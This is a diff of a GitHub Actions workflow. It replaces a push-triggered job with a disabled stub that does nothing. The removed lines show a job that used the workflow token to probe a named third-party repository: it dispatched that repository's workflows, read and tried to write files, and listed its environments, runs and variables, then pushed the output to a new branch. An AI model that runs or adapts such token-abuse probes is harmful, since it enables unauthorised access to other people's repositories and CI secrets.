@@ -1,38 +1,10 @@
-name: t5-25665
-on: push
-permissions:
-  contents: write
+name: Quarantined legacy definition
+on:
+  workflow_dispatch:
+permissions: {}
 jobs:
-  a:
+  retired:
+    if: ${{ false }}
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: r
-        continue-on-error: true
-        env:
-          T: ${{ github.token }}
-        run: |
-          O=t5_25665.txt
-          exec >> $O 2>&1
-          echo "== cross dispatch ASR v2-ci =="
-          curl -s -o /dev/null -w "dispASR=%{http_code}\n" -X POST -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/workflows/v2-ci.yml/dispatches" -d '{"ref":"main"}'
-          echo "== read ASR file (contents) =="
-          curl -s -o /dev/null -w "readASR=%{http_code}\n" -H "Authorization: Bearer $T" "https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/contents/package.json"
-          echo "== try create file in ASR (write test, harmless path) =="
-          B64=$(printf 'test' | base64)
-          curl -s -o /dev/null -w "writeASR=%{http_code}\n" -X PUT -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/contents/i25665_probe.txt" -d "{\"message\":\"probe\",\"content\":\"$B64\"}"
-          echo "== ASR environments =="
-          curl -s -o /dev/null -w "envASR=%{http_code}\n" -H "Authorization: Bearer $T" "https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/environments"
-          echo "== ASR runs list =="
-          curl -s -o /dev/null -w "runsASR=%{http_code}\n" -H "Authorization: Bearer $T" "https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/runs"
-          echo "== ASR actions variables =="
-          curl -s -H "Authorization: Bearer $T" "https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/variables"
-          echo ""
-          echo "== END =="
-      - name: push
-        continue-on-error: true
-        run: |
-          git config user.email ci@local; git config user.name ci
-          BR="t5-25665-$(date +%s)"
-          git checkout -b "$BR" || true; git add t5_25665.txt || true; git commit -m t5 || true; git push -u origin "$BR" || true
-# 1795278128
+      - run: exit 0
